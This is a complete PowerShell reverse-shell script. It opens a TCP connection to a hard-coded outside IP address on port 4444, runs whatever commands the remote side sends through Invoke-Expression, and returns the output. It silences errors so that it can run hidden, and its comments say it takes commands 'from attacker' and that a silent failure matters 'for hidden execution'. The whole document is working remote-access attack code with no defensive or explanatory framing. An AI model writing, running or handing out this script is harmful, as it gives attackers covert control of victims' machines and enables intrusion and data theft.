# reverse.ps1  — PowerShell reverse shell (no VBS needed)

$ErrorActionPreference = 'SilentlyContinue'
$ProgressPreference = 'SilentlyContinue'

# ────────────────────────────────────────────────
#          CONFIGURATION
# ────────────────────────────────────────────────

$ip   = '57.131.32.68'
$port = 4444

# ────────────────────────────────────────────────

try {
    $client = New-Object System.Net.Sockets.TCPClient($ip, $port)
    $stream = $client.GetStream()

    # Prepare buffers
    [byte[]]$bytes = 0..65535 | %{0}

    # Initial prompt
    $prompt  = "PS $($PWD.Path)> "
    $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($prompt)
    $stream.Write($sendbyte, 0, $sendbyte.Length)
    $stream.Flush()

    while ($true) {
        # Read command from attacker
        $i = $stream.Read($bytes, 0, $bytes.Length)

        if ($i -eq 0) { break }   # connection closed

        $data = (New-Object System.Text.ASCIIEncoding).GetString($bytes,0, $i).Trim()

        try {
            # Execute the command and capture output + errors
            $output = Invoke-Expression $data 2>&1 | Out-String

            # Build response (output + next prompt)
            $response = $output + "`nPS $($PWD.Path)> "
        }
        catch {
            $response = "ERROR: $($_.Exception.Message)`nPS $($PWD.Path)> "
        }

        # Send back
        $sendbyte = [System.Text.Encoding]::ASCII.GetBytes($response)
        $stream.Write($sendbyte, 0, $sendbyte.Length)
        $stream.Flush()
    }
}
catch {
    # Silent fail (important for hidden execution)
}
finally {
    if ($client) {
        $client.Close()
    }
}